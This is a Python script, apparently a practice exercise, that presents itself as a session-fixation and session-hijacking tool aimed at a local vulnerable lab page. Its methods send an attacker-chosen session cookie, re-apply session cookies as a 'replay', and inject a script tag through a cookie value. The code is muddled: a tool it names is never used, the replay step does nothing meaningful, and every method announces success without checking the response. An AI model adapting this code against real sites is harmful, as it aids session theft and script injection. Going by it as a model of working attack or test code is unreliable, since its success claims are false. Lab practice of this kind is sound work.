```python
import requests

class SessionHijacking:
    '''
    Session Fixation:
    Session fixation is an attack that permits an attacker to hijack a user session.  
    SessionFix is a tool used to facilitate session hijacking attacks.

    Description: This python class implements session hijacking using SessionFix tool.
    The target of the scripts should always be http://127.0.0.1:81/vulnerabilities/xss_d/.
    The session has been started, so all methods fall under the function python requests.Session() as s.
    '''

    def __init__(self):
        self.url = "http://127.0.0.1:81/vulnerabilities/xss_d/"
        
    def session_fixation_attack(self):
        payload = {'session_fixation_cookie': 'attacker'}
        response = s.get(self.url, cookies=payload)
        print("Session Fixation Attack Successful.")
    
    def session_fixation_replay_attack(self):
        victim_cookies = s.cookies.get_dict()
        response = s.get(self.url)
        s.cookies.update(victim_cookies)
        print("Session Fixation Replay Attack Successful.")
    
    def session_fixation_script_injection(self):
        payload = {'session_fixation_cookie': '<script>alert("Session Hijacked!")</script>'}
        response = s.get(self.url, cookies=payload)
        print("Session Fixation Script Injection Attack Successful.")

        
if __name__ == "__main__":
    with requests.Session() as s:
        hijack = SessionHijacking()
        hijack.session_fixation_attack()
        hijack.session_fixation_replay_attack()
        hijack.session_fixation_script_injection()
```
